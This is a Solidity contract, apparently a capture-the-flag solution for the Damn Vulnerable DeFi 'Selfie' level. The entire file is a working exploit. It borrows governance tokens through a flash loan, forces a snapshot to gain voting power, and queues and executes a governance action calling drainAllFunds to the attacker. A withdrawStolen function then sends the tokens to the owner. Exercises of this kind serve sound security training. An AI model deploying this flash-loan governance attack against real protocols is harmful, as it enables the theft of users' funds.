// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

contract AttackSelfie {

    address public immutable  owner;

    SimpleGovernance public immutable govContract;
    SelfiePool public immutable poolContract;

    DamnValuableTokenSnapshot public token;

    uint256 private drainerNumber = 1_500_000 * 10 ** 18;

    uint256 public id;

    constructor(address _gov, address _pool, address tokenAddress) {
        owner = msg.sender;
        token = DamnValuableTokenSnapshot(tokenAddress);
        govContract = SimpleGovernance(_gov);
        poolContract = SelfiePool(_pool);
    }

    // 1. Queue an action in gov with data 'drainAllFunds(address)'  
    function receiveTokens(address tokenAddr, uint256 amount) external {
        // force a snapshot
        token.snapshot();

        bool success = token.transfer(address(poolContract), amount);
        require(success == true, "couldn't be sent");
    }

    // Trigger flashLoan
    function LoanTrigger() public {
        poolContract.flashLoan(drainerNumber);

        id = govContract.queueAction(address(poolContract), getData(), 0);
    } 

    function getData() internal view returns (bytes memory) {
        return abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(this)
            );
    }

    function DrainTrigger() public {
        govContract.executeAction(id);
    }

    function withdrawStolen() public {
        require(msg.sender == owner, 'owner issue');
        token.transfer(owner, token.balanceOf(address(this)));
    }

}